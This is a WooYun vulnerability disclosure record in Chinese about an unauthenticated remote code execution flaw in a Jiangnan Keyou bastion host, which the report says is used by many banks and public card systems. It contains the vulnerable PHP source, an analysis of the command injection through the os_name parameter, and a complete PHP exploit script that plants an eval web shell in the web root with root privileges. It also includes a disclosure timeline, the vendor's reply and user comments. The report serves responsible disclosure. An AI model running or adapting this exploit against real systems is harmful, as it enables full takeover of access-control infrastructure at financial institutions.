{"id": 48647, "wybug_id": "wooyun-2014-077033", "wybug_title": "江南科友堡垒机getshell(无需登录附poc)", "wybug_corp": "江南科友科技股份有限公司", "wybug_author": "路人甲", "wybug_date": "2014-09-23 08:42", "wybug_open_date": "2014-12-22 08:46", "wybug_type": "设计不当", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-22：\t细节向公众公开  简要描述： 由一漏洞直接getshell(已经写好poc),一键取shell。获取的webshell均为root。可导致江南科友堡垒机核心源码泄露（现已获取该核心源码）。如果其他厂商要OEM该堡垒机可参照此代码，所以本身做为安全厂商，请你穿好裤子再出来保护他人 详细说明：    接着上一旦： WooYun: 江南科友堡垒机远程代码执行漏洞第二弹（无需登录直接写shell) 漏洞涉及客户如下：国内各大银行：中国银行、民生银行、广东发展银行、平安银行、深圳发展银行、浦发银行、渤海银行总行及各分行、中国工商银行、中国农业银行、中国建设银行、交通银行、招商银行、中信银行、兴业银行、华夏银行、中国邮政储蓄银行总行或部分分行中国银联：总公司及北京、广州、深圳、南京、福州、长沙、武汉、济南、青岛、沈阳、郑州、海口、天津、香港、厦门等分公司银联数据：全国卡系统业务托管商业银行外资银行：渣打银行、东亚银行：全国境内各个分行外资金融机构：韩亚银行、花旗银行、通用电气、星展银行、美国第一资讯（FDC)地方商业银行及农村信用社：40余家商业银行及农村信用社社会保障与公共交通系统：湖北、黑龙江、广东、北京等社保卡安全系统，上海市公交一卡通安全系统，杭州市市民卡系统，长春一汽企业IC卡加密系统，宁波市民卡系统，郑州交通一卡通系统，山东一卡通系统涉及的都是重要部门，银行及金融、证券、能源等单位。看漏洞吧！0x01 漏洞分析   在manager/config_SSO.php当中 此页面未做任何权限判断，导致任意用户可访问。  如图： \n\n  具体产生漏洞代码如下（前提是你已经获取该源码）： \nif(empty($_POST['os_name']) )\t{\t\t$os_name = $os_list[0]['name'];\t}\telse\t{\t\t$os_name = $_POST['os_name'];\t}\t\t$Template = '/usr/local/keyou/Config/sso/'.$os_name.\"/Template.cnf\";\t$TelnetLogin = '/usr/local/keyou/Config/sso/'.$os_name.\"/TelnetLogin.cnf\";\t$TelnetPassword = '/usr/local/keyou/Config/sso/'.$os_name.\"/TelnetPassword.cnf\";\t$TelnetSuccess = '/usr/local/keyou/Config/sso/'.$os_name.\"/TelnetSuccess.cnf\";\t\t$SSHPassword = '/usr/local/keyou/Config/sso/'.$os_name.\"/SSHPassword.cnf\";\t$SSHSuccess = '/usr/local/keyou/Config/sso/'.$os_name.\"/SSHSuccess.cnf\";\t$TermPath = '/usr/local/keyou/Config/sso/'.$os_name.\"/TermPath.cnf\";\t\t$EnPassword = '/usr/local/keyou/Config/sso/'.$os_name.\"/EnPassword.cnf\";\t\t\t$TerminalChoose = '/usr/local/keyou/Config/sso/'.$os_name.\"/TerminalChoose.cnf\";\t$SystemPrompt = '/usr/local/keyou/Config/sso/'.$os_name.\"/SystemPrompt.cnf\";\t$PassModeChoose = '/usr/local/keyou/Config/sso/'.$os_name.\"/PassModeChoose.cnf\";\t\t$OldPass = '/usr/local/keyou/Config/sso/'.$os_name.\"/OldPass.cnf\";\t$NewPass = '/usr/local/keyou/Config/sso/'.$os_name.\"/NewPass.cnf\";\t$ReNewPass = '/usr/local/keyou/Config/sso/'.$os_name.\"/ReNewPass.cnf\";\t$ChangeSuccess = '/usr/local/keyou/Config/sso/'.$os_name.\"/ChangeSuccess.cnf\";\t\tfunction WriteTo_Conf($message,$filename)  {  \t  \texec(MYSUDO.\"chown -R daemon:daemon /usr/local/keyou/Config/sso\");  \t$message = str_replace(\"\\'\",\"'\",$message);  \t//$$message=addslashes($message);  \t$message = str_replace(\";\",\"\\n\",$message);  \t    if(!($handle = fopen($filename,'w'))){    \t//echo \"不能打开文本$filename!\";    \treturn false;\t    }    else{    \tif(fwrite($handle,$message,strlen($message)) === false){    \t\t//echo \"不能写入文本$filename!\";    \t\tfclose($handle);    \t  return false;\t    \t}    \telse{    \t\t    \t\t//echo \"成功写入文本$filename!\"; echo \"<br>\";    \t\tfclose($handle);    \t\treturn true;    \t}    }    fclose($handle);  }\t  function ReadFromConf($filename)  {  \texec(MYSUDO.\"chown -R daemon:daemon /usr/local/keyou/Config/sso\");  \tif(file_exists($filename))  \t{    \t$handle = fopen($filename,'r');    \tif(!filesize($filename))    \t{\t    \t\tfclose($handle);    \t\treturn null;    \t}    \t$i=0;    \twhile (!feof($handle)) \t\t\t{\t\t\t\t$file_info[$i] = fgets($handle, 4096);\t\t\t\t$i++;\t\t\t}    \t//$contents = fread($handle,filesize($filename));\t    \tfclose($handle);    \t//echo \"<br>\";    \t    \t//$file_info = explode(\"\\n\",$contents);    \t//print_r($file_info);    \t$str_info = implode(\";\",$file_info);    \treturn $str_info;\t//返回一个数组；  \t}   \telse   \t{  \t\t$handle = fopen($filename,'w+');  \t\tfclose($handle);  \t\treturn null;  \t}  }      \tfor($i=0;$i< count($os_list);$i++)\t{\t\tif($os_list[$i]['name'] == $os_name)\t\t{\t\t\t$os_list[$i]['selected'] = 1;\t\t\t\t$admin_passinfo = $os_list[$i]['admin_passinfo'];\t\t}\t\t\t\t}\t\tif(!empty($_POST['config_flag']))\t{\t\tWriteTo_Conf($_POST['type_mode'],$Template);\t\t\t\tWriteTo_Conf($_POST['telnet_os_login_mes'],$TelnetLogin);\t\tWriteTo_Conf($_POST['telnet_psw_enter_mes'],$TelnetPassword);\t\tWriteTo_Conf($_POST['telnet_login_ok_mes'],$TelnetSuccess);\t\t\tWriteTo_Conf($_POST['ssh_psw_enter_mes'],$SSHPassword);\t\tWriteTo_Conf($_POST['ssh_login_ok_mes'],$SSHSuccess);\t\tWriteTo_Conf($_POST['xwin_order'],$TermPath);\t\t\t\tWriteTo_Conf($_POST['TerminalChoose'],$TerminalChoose);\t\tWriteTo_Conf($_POST['SystemPrompt'],$SystemPrompt);\t\tWriteTo_Conf($_POST['PassModeChoose'],$PassModeChoose);\t\tWriteTo_Conf($_POST['enter_oldpsw_mes'],$OldPass);\t\tWriteTo_Conf($_POST['enter_newpsw_mes'],$NewPass);\t\tWriteTo_Conf($_POST['confirm_psw_mes'],$ReNewPass);\t\tWriteTo_Conf($_POST['confirm_psw_ok_mes'],$ChangeSuccess);\t\t\t\tif($_POST['type_mode'] == 'cisco' || $_POST['type_mode'] == 'h3c')\t\t{\t\t\tif(empty($admin_passinfo))\t\t\t{\t\t\t\t$admin_passinfo=\"Password:\";\t\t\t}\t\t\tWriteTo_Conf($admin_passinfo,$EnPassword);\t\t}\t\t\t\t//echo \" /usr/local/keyou/Bin/GenScript \".$_POST['os_name'].\" \".$_POST['service_type'];echo \"<br>\";\t\texec(MYSUDO.\" /usr/local/keyou/Bin/GenScript \".$os_name.\" ssh\");\t\texec(MYSUDO.\" /usr/local/keyou/Bin/GenScript \".$os_name.\" telnet\");\t\twrite_ed();\t\t$cl = new CommonLogo();\t\t\t$cl->addLogo($account,\"设备帐户管理\",\"配置操作系统参数\",$_SERVER['REMOTE_ADDR']);\t\t$cl->close();\t\t//echo '<script type=\"text/javascript\">';\t\t//echo 'alert(\"配置成功\")';\t\t//echo '</script>';\t\t$error = 1;\t}\n 我将整个产生问题的代码都贴出来了。。  分析如下： WriteTo_Conf($_POST['type_mode'],$Template);这里post的包可控，看看$Template变量$Template = '/usr/local/keyou/Config/sso/'.$os_name.\"/Template.cnf\";继续跟踪$os_name\nif(empty($_POST['os_name']) )\t{\t\t$os_name = $os_list[0]['name'];\t}\telse\t{\t\t$os_name = $_POST['os_name'];\t}\n所以只要你POST一个os_name即可可控。思考问题1：  这样能写文件了，但是能直接写php吗？ 能直接写到该堡垒机的控制端里面去吗？ 不行，文件名已经限制死了，文件名为：Template.cnf 所以怎么写shell？？？ 发散思维。。看下面的代码。\nexec(MYSUDO.\" /usr/local/keyou/Bin/GenScript \".$os_name.\" ssh\");\t\texec(MYSUDO.\" /usr/local/keyou/Bin/GenScript \".$os_name.\" telnet\");\t\twrite_ed();\t\t$cl = new CommonLogo();\n这里有个exec函数，其中$os_name可控，（虽然前面写文件会报错），但不影响它执行。。所以这里直接一个cp 或者 mv 命令即可将我们的shell写到 堡垒机的控制端里面了。思路如下：  1、控制好type_mode 变量以及 os_name变量， os_name这个值其实几个都是固定的，我们选取其中一个即可，我取（HP_11），触发条件为config_flag变量存在的情况。  2、通过前面第一步将我们的恶意代码写入到/usr/local/keyou/Config/sso/HP_11/Template.cnf文件当中了，然后借助后面的命令执行将我们的恶意代码cp 或者 mv到控制端即可。（其中/usr/local/keyou/Config/sso/ 路径都是源码里面写死了的，顾可得知，堡垒机控制端目录也是固定的）。 所以结合上面思路，写个poc如下。 即可做到一键控制整个堡垒机了，也就可以拿到堡垒机核心源码了。 权限均为：root.. 以下poc仅供测试用，非法攻击后果自负。。 \n<?phpprint_r('      +--------------------------------------------------------------+\t                    江南科友 Getshell  Exploit\t\t\t\t        +--------------------------------------------------------------+');if ($argc < 2) {      print_r('      +--------------------------------------------------------------+                  Example:                  php '.$argv[0].' localhost      +--------------------------------------------------------------+      ');      exit;}$host = $argv[1];$path = \"/manager/config_SSO.php\";$url = 'https://'.$host.$path;$data =\"type_mode=5201314<?php eval(\\$_POST[cmd]);?>&os_name=HP_11&config_flag=1\";$data2 =\"os_name=a | cp /usr/local/keyou/Config/sso/HP_11/Template.cnf /usr/local/apache2/htdocs/project/www/shell.php |&config_flag=1\";vpost($url,$data);vpost($url,$data2);$url2 = 'https://'.$host.'/shell.php';$resutl_data = vpost($url2,'');function vpost($url,$data){ // 模拟提交数据函数\t$curl = curl_init(); \tcurl_setopt ( $curl, CURLOPT_URL, $url ); // \tcurl_setopt ( $curl, CURLOPT_SSL_VERIFYPEER, 0 ); \tcurl_setopt ( $curl, CURLOPT_SSL_VERIFYHOST, 0 ); \tcurl_setopt ( $curl, CURLOPT_USERAGENT, \"Mozilla/4.0\" ); \t@curl_setopt ( $curl, CURLOPT_FOLLOWLOCATION, 1 ); \tcurl_setopt ( $curl, CURLOPT_AUTOREFERER, 1 ); \tcurl_setopt ( $curl, CURLOPT_POST, 1 ); \tcurl_setopt ( $curl, CURLOPT_POSTFIELDS, $data ); \tcurl_setopt ( $curl, CURLOPT_TIMEOUT, 120 ); \tcurl_setopt ( $curl, CURLOPT_HEADER, 0 ); \tcurl_setopt ( $curl, CURLOPT_RETURNTRANSFER, 1 );\t$tmpInfo = curl_exec ( $curl ); \tif (curl_errno ( $curl )) {\t\techo 'Errno' . curl_error ( $curl );\t}    return $tmpInfo; // 返回数据}  \t    if(strstr($resutl_data,\"5201314\") != NULL) {\t  print '               Shell: '.$url2.'  password: cmd\t\t\t';\t    \t}else {\t  print '      Shell is not exists';exit();\t}\n给个截图： \n\n\n\n所以自身是堡垒机，请穿好你的裤子   漏洞证明：   \n\n\n\n   修复方案：  加权限、然后对传进来的数据进行判断和过滤。。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2014-09-26 14:50 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-23 10:53 |    \t\t付弘雪 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:10        | 希望和业内各位大牛多多交流)\t\t \n  这简单描述有点吊啊    \n     2014-09-23 11:47 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  所以本身做为安全厂商，请你穿好裤子再出来保护他人    \n     2014-09-23 15:04 |    \t\t坏虾 \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:8        | From Internet,For Internet……BY：坏虾)\t\t \n  请洞主看好水表，公司已经报案。    \n     2014-09-23 17:31 |    \t\tcuger \t\t\t( 普通白帽子  |\t\t\t        Rank:200 漏洞数:44        | 这个家伙很懒，什么也没留下)\t\t \n  神奇的路人甲啊，明显是同一个人，太屌了！！！！    \n     2014-09-23 21:04 |    \t\tHonker红颜 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:51        | 皖南人士,90后宅男,自学成才,天朝教育失败....)\t\t \n  所以本身做为安全厂商，请你穿好裤子再出来保护他人    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}